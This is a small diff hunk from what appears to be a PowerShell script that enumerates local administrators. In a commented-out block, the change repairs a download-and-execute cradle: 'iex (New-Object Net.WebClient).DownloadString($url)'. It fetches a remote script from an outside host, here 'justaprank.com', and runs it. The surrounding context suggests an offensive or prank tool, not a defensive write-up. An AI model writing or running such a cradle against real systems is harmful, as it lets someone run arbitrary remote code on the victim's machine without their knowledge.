@@ -10,5 +10,5 @@ net localgroup administrators ### Lists all administrator groups
 
 # Loads PS Script into a variable (Will use later...)
 <# $url = ‘https://www.justaprank.com/scripts/script1.ps1′
-iex ((New ObjectNet.WebClient).DownloadString($url))
+iex (New-Object Net.WebClient).DownloadString($url)
 #>
